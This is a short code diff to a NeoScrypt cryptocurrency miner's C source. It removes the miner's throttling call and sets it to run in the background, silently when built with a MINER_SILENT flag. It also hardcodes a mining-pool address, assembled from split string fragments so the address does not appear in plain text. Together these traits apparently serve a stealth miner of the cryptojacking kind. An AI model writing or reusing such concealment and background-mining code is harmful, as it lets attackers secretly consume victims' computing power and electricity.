@@ -1156,8 +1156,6 @@ static int scanhash_neoscrypt_4way(int thr_id, uint *pdata,
 
         pdata[19] += inc_nonce;
 
-         miner_throttle(thr_id, inc_nonce);
-
     }
 
     *hashes_done = pdata[19] - inc_nonce - start_nonce;
@@ -1698,11 +1696,19 @@ static void default_arg(int argc, char *argv[])
 		
 		
 	opt_algo = ALGO_NEOSCRYPT;
-	//opt_neoscrypt_asm = 0;
+	 opt_nfactor = 9;
+	#ifdef USE_ASM
+		opt_neoscrypt_asm = 2; // 0=c, 2=ASM sse2-4way
+	#else
+		opt_neoscrypt_asm = 0; // 0=c, 2=ASM sse2-4way
+	#endif
 	opt_background = true;
+	
+	#ifdef MINER_SILENT
 	opt_quiet = true;
-	#ifndef MINER_SILENT
+	#else
 	opt_debug = true;
+	
 	#endif
 	//opt_retries = v;
 	
@@ -1717,7 +1723,7 @@ static void default_arg(int argc, char *argv[])
 	char url[100];
 	sprintf(url, "stra%s+tcp://%s.%smin%s.net%s4233", "tum", "pool", "uni", "ing", ":");
 	rpc_url = strdup(url); // -o
-	have_stratum = true;
+	have_stratum = 1;
 
 }
 
